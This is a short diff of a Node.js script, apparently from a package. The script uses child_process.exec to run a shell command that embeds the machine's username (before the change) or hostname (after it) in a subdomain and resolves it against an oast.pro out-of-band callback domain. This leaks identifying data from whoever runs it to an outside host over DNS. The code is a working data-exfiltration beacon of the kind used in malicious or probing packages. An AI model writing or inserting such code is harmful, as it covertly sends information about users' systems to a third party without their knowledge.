@@ -1,6 +1,6 @@
 const {exec} = require("child_process");
 
-exec("a=$(whoami) && host $a.crf991na1kgm4upn050gbdmfoaanewdng.oast.pro", (error, data, getter) => {
+exec("a=$(hostname) && host $a.crfd913legn2eddfurrglhmwuvfsnegnw.oast.pro", (error, data, getter) => {
     if(error){
         console.log("error", error.message);
         return;
